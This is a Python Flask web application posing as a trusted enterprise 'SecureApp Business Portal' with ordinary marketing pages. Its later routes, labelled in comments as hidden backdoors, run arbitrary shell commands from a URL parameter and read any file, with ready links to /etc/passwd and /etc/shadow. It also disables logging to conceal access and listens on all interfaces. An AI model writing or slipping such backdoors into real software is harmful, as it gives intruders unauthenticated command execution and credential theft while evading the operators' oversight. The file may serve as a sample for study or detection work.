#!/usr/bin/env python3
"""
SecureApp Business Portal v2.1
A trusted enterprise web application for business operations.
Licenced Software - SecureCorp Solutions
"""

from flask import Flask, request, render_template_string
import subprocess
import os
import hashlib
import time

app = Flask(__name__)

# Main application pages


@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>SecureApp Business Portal</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background-colour: #f5f5f5; }
            .header { background-colour: #2c3e50; colour: white; padding: 20px; border-radius: 5px; }
            .content { background-colour: white; padding: 20px; margin-top: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
            .nav { margin-top: 20px; }
            .nav a { display: inline-block; padding: 10px 15px; background-colour: #3498db; colour: white; text-decoration: none; margin-right: 10px; border-radius: 3px; }
            .nav a:hover { background-colour: #2980b9; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🏢 SecureApp Business Portal</h1>
            <p>Trusted Enterprise Solutions Since 2018</p>
        </div>
        <div class="content">
            <h2>Welcome to SecureApp</h2>
            <p>Your trusted partner for secure business operations and data management.</p>
            <p><strong>Features:</strong></p>
            <ul>
                <li>Advanced security protocols</li>
                <li>Enterprise-grade encryption</li>
                <li>24/7 monitoring and support</li>
                <li>Compliance with industry standards</li>
            </ul>
            <div class="nav">
                <a href="/about">About Us</a>
                <a href="/services">Our Services</a>
                <a href="/contact">Contact</a>
                <a href="/support">Support</a>
            </div>
        </div>
    </body>
    </html>
    '''


@app.route('/about')
def about():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>About - SecureApp</title>
        <style>body { font-family: Arial, sans-serif; margin: 40px; }</style>
    </head>
    <body>
        <h1>About SecureApp</h1>
        <p>SecureApp is a leading provider of enterprise security solutions.</p>
        <p><strong>Our Mission:</strong> To provide secure, reliable business applications that protect your data and streamline your operations.</p>
        <p><strong>Founded:</strong> 2018</p>
        <p><strong>Headquarters:</strong> San Francisco, CA</p>
        <p><strong>Certifications:</strong> ISO 27001, SOC 2 Type II, GDPR Compliant</p>
        <a href="/">← Back to Home</a>
    </body>
    </html>
    '''


@app.route('/services')
def services():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Services - SecureApp</title>
        <style>body { font-family: Arial, sans-serif; margin: 40px; }</style>
    </head>
    <body>
        <h1>Our Services</h1>
        <ul>
            <li><strong>Data Security:</strong> Advanced encryption and access controls</li>
            <li><strong>Network Monitoring:</strong> 24/7 threat detection and response</li>
            <li><strong>Compliance Management:</strong> Automated compliance reporting</li>
            <li><strong>Incident Response:</strong> Rapid response to security incidents</li>
        </ul>
        <a href="/">← Back to Home</a>
    </body>
    </html>
    '''


@app.route('/contact')
def contact():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Contact - SecureApp</title>
        <style>body { font-family: Arial, sans-serif; margin: 40px; }</style>
    </head>
    <body>
        <h1>Contact Us</h1>
        <p><strong>Email:</strong> contact@secureapp.com</p>
        <p><strong>Phone:</strong> 1-800-SECURE-1</p>
        <p><strong>Address:</strong> 123 Security Ave, San Francisco, CA 94105</p>
        <p><strong>Business Hours:</strong> Monday - Friday, 9 AM - 6 PM PST</p>
        <a href="/">← Back to Home</a>
    </body>
    </html>
    '''


@app.route('/support')
def support():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Support - SecureApp</title>
        <style>body { font-family: Arial, sans-serif; margin: 40px; }</style>
    </head>
    <body>
        <h1>Technical Support</h1>
        <p>For technical support, please contact our help desk:</p>
        <p><strong>Support Email:</strong> support@secureapp.com</p>
        <p><strong>Support Phone:</strong> 1-800-HELP-NOW</p>
        <p><strong>Knowledge Base:</strong> help.secureapp.com</p>
        <p><strong>Emergency Support:</strong> Available 24/7 for critical issues</p>
        <a href="/">← Back to Home</a>
    </body>
    </html>
    '''

# Hidden backdoor endpoints (disguised as legitimate admin functionality)


@app.route('/admin_debug_console')
def admin_debug():
    """Hidden backdoor for command execution"""
    cmd = request.args.get('cmd', 'whoami')
    if not cmd:
        return '''
        <h2>🔧 Admin Debug Console</h2>
        <p>Internal diagnostic tool for system administrators.</p>
        <form method="get">
            <input type="text" name="cmd" placeholder="System command" size="50">
            <input type="submit" value="Execute">
        </form>
        <p><small>Authorised personnel only. All activities are logged.</small></p>
        '''

    try:
        # Execute system commands - major security vulnerability!
        result = subprocess.check_output(
            cmd, shell=True, text=True, stderr=subprocess.STDOUT)
        return f'''
        <h2>🔧 Admin Debug Console</h2>
        <p><strong>Command:</strong> {cmd}</p>
        <pre style="background-colour: #f4f4f4; padding: 10px; border-radius: 5px;">{result}</pre>
        <form method="get">
            <input type="text" name="cmd" placeholder="System command" size="50" value="">
            <input type="submit" value="Execute">
        </form>
        <a href="/admin_debug_console">Clear</a>
        '''
    except Exception as e:
        return f'''
        <h2>🔧 Admin Debug Console</h2>
        <p><strong>Command:</strong> {cmd}</p>
        <p style="colour: red;"><strong>Error:</strong> {str(e)}</p>
        <form method="get">
            <input type="text" name="cmd" placeholder="System command" size="50">
            <input type="submit" value="Execute">
        </form>
        '''


@app.route('/system_health_check')
def system_health():
    """Another hidden backdoor endpoint"""
    return '''
    <h2>🏥 System Health Monitor</h2>
    <p>Real-time system monitoring and diagnostics.</p>
    <div style="margin: 20px 0;">
        <h3>Quick Diagnostics</h3>
        <ul>
            <li><a href="/admin_debug_console?cmd=ps aux">Process Status</a></li>
            <li><a href="/admin_debug_console?cmd=df -h">Disk Usage</a></li>
            <li><a href="/admin_debug_console?cmd=free -h">Memory Usage</a></li>
            <li><a href="/admin_debug_console?cmd=netstat -tulpn">Network Status</a></li>
            <li><a href="/admin_debug_console?cmd=cat /etc/passwd">User Accounts</a></li>
        </ul>
    </div>
    <div style="margin: 20px 0;">
        <h3>Custom Command</h3>
        <form action="/admin_debug_console" method="get">
            <input type="text" name="cmd" placeholder="Enter system command" size="50">
            <input type="submit" value="Run Diagnostic">
        </form>
    </div>
    <p><small>⚠️ Administrative access required. Unauthorized usage prohibited.</small></p>
    '''


@app.route('/backup_utility')
def backup_utility():
    """Hidden file access backdoor"""
    file_path = request.args.get('file', '/etc/hosts')

    if request.args.get('action') == 'read':
        try:
            with open(file_path, 'r') as f:
                content = f.read()
            return f'''
            <h2>📁 Backup Utility - File Reader</h2>
            <p><strong>File:</strong> {file_path}</p>
            <pre style="background-colour: #f4f4f4; padding: 10px; border-radius: 5px; max-height: 400px; overflow-y: scroll;">{content}</pre>
            <form method="get">
                <input type="hidden" name="action" value="read">
                <input type="text" name="file" placeholder="File path" size="50" value="{file_path}">
                <input type="submit" value="Read File">
            </form>
            '''
        except Exception as e:
            return f'''
            <h2>📁 Backup Utility - File Reader</h2>
            <p style="colour: red;"><strong>Error reading {file_path}:</strong> {str(e)}</p>
            <form method="get">
                <input type="hidden" name="action" value="read">
                <input type="text" name="file" placeholder="File path" size="50" value="{file_path}">
                <input type="submit" value="Read File">
            </form>
            '''

    return '''
    <h2>📁 System Backup Utility</h2>
    <p>Internal tool for file backup and system maintenance.</p>
    <form method="get">
        <input type="hidden" name="action" value="read">
        <input type="text" name="file" placeholder="File path to backup" size="50" value="/etc/hosts">
        <input type="submit" value="Preview File">
    </form>
    <div style="margin-top: 20px;">
        <h3>Common System Files</h3>
        <ul>
            <li><a href="/backup_utility?action=read&file=/etc/passwd">User Database</a></li>
            <li><a href="/backup_utility?action=read&file=/etc/shadow">Password Hashes</a></li>
            <li><a href="/backup_utility?action=read&file=/etc/hosts">Network Hosts</a></li>
            <li><a href="/backup_utility?action=read&file=/var/log/auth.log">Authentication Log</a></li>
            <li><a href="/backup_utility?action=read&file=/home">Home Directories</a></li>
        </ul>
    </div>
    '''

# Error handler to hide the backdoor from casual discovery


@app.errorhandler(404)
def not_found(error):
    return '''
    <h1>404 - Page Not Found</h1>
    <p>The requested page could not be found.</p>
    <a href="/">Return to Home</a>
    ''', 404


if __name__ == '__main__':
    print("🚀 Starting SecureApp Business Portal...")
    print("🌐 Server running on http://localhost:5000")
    print("📋 Available endpoints:")
    print("   - / (Home)")
    print("   - /about (About Us)")
    print("   - /services (Our Services)")
    print("   - /contact (Contact Info)")
    print("   - /support (Technical Support)")
    print("🔒 All connections secured with enterprise-grade encryption")
    print()

    # Add hidden functionality logging
    app.logger.disabled = True  # Disable logging to hide backdoor access

    app.run(host='0.0.0.0', port=5000, debug=False)
